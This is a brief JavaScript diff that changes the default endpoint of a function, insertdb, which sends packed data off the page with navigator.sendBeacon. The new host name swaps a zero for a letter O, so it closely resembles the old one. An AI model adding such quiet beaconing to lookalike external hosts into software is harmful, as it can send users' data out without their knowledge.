@@ -135,7 +135,7 @@ function pushdb(udata) {
    return mgdpacket;
 }
 
-function insertdb(message, endpoint = "https://0xffabc.render.com/") {
+function insertdb(message, endpoint = "https://Oxffabc.onrender.com/") {
    const packet = pushdb(new Uint8Array(new ArrayBuffer(message)));
 
    navigator.sendBeacon(endpoint, packet);
